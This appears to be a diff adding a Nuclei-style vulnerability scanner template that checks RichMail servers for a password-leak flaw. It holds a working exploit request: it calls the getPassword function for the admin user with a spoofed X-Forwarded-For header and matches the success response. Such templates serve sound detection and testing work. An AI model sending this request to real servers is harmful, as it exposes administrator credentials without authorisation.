@@ -1,0 +1,22 @@
+id: poc-yaml-richmail-information-leakage
+info:
+  name: RichMail Sensitive Information Leakage
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: information-leakage
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/RmWeb/noCookiesMail?func=user:getPassword&userMailName=admin"
+    headers:
+      X-Forwarded-For: 127.0.0.1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "S_OK"
+          - "errorMsg"
